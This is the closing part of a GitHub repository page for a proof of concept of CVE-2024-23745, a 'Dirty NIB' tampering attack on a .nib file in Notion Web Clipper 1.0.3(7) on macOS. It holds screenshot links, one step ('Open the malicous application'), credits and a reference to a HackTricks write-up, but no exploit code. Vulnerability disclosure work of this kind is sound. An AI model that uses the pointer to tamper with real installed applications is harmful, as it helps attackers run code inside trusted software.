[![image9](https://private-user-images.githubusercontent.com/100588945/299819342-e0cc2e78-6f55-41a9-8b91-8dfe8929aec0.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTQ0ODUsIm5iZiI6MTczNjg5NDE4NSwicGF0aCI6Ii8xMDA1ODg5NDUvMjk5ODE5MzQyLWUwY2MyZTc4LTZmNTUtNDFhOS04YjkxLThkZmU4OTI5YWVjMC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjM2MjVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT03ZTlhOTBhZTYwZTlmMmFkODRkNjViNmU1YzZkMjMwODhmYjUyMTM3OWFhZjUzMDhjM2EwZGQ2NWEyNTQ2OTI4JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.4Po9E6CXFBHqkgNmcIteKm_0D_2zw9QhUFZDMHsXA8g)](https://private-user-images.githubusercontent.com/100588945/299819342-e0cc2e78-6f55-41a9-8b91-8dfe8929aec0.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTQ0ODUsIm5iZiI6MTczNjg5NDE4NSwicGF0aCI6Ii8xMDA1ODg5NDUvMjk5ODE5MzQyLWUwY2MyZTc4LTZmNTUtNDFhOS04YjkxLThkZmU4OTI5YWVjMC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjM2MjVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT03ZTlhOTBhZTYwZTlmMmFkODRkNjViNmU1YzZkMjMwODhmYjUyMTM3OWFhZjUzMDhjM2EwZGQ2NWEyNTQ2OTI4JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.4Po9E6CXFBHqkgNmcIteKm_0D_2zw9QhUFZDMHsXA8g)

- Open the malicous application

[![image10](https://private-user-images.githubusercontent.com/100588945/299819362-2f5ed801-0cb5-4f0c-bb66-38e7c2f9f59f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTQ0ODUsIm5iZiI6MTczNjg5NDE4NSwicGF0aCI6Ii8xMDA1ODg5NDUvMjk5ODE5MzYyLTJmNWVkODAxLTBjYjUtNGYwYy1iYjY2LTM4ZTdjMmY5ZjU5Zi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjM2MjVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT04ODUzMmNlNThkOWI2ZGYwYmE3ZjMwZTk2NmVmZTI4MTUwNzJkMDA0ZDE1NTVhM2MxNzBhZGE0YjEzNGVjNjJhJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.EavAV5g46jkPPbrZfkFkeNvVY3ut7xH63tAR5lQeBm4)](https://private-user-images.githubusercontent.com/100588945/299819362-2f5ed801-0cb5-4f0c-bb66-38e7c2f9f59f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTQ0ODUsIm5iZiI6MTczNjg5NDE4NSwicGF0aCI6Ii8xMDA1ODg5NDUvMjk5ODE5MzYyLTJmNWVkODAxLTBjYjUtNGYwYy1iYjY2LTM4ZTdjMmY5ZjU5Zi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjM2MjVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT04ODUzMmNlNThkOWI2ZGYwYmE3ZjMwZTk2NmVmZTI4MTUwNzJkMDA0ZDE1NTVhM2MxNzBhZGE0YjEzNGVjNjJhJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.EavAV5g46jkPPbrZfkFkeNvVY3ut7xH63tAR5lQeBm4)
## Thanks

Thanks to Giovanni Lima, Cyber Security Engineer and friend. We worked together to reproduce de Dirty Nib PoC 😎

## References:

<https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-dirty-nib>

<https://www.notion.so/web-clipper>

## About

In Notion Web Clipper 1.0.3(7), a .nib file is susceptible to the Dirty NIB attack.

### Resources

[Readme](#readme-ov-file)

[Activity](/louiselalanne/CVE-2024-23745/activity)
### Stars

[**2**
stars](/louiselalanne/CVE-2024-23745/stargazers)
### Watchers

[**1**
watching](/louiselalanne/CVE-2024-23745/watchers)
### Forks

[**1**
fork](/louiselalanne/CVE-2024-23745/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Flouiselalanne%2FCVE-2024-23745&report=louiselalanne+%28user%29)

## [Releases](/louiselalanne/CVE-2024-23745/releases)

No releases published

## [Packages 0](/users/louiselalanne/packages?repo_name=CVE-2024-23745)

No packages published

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


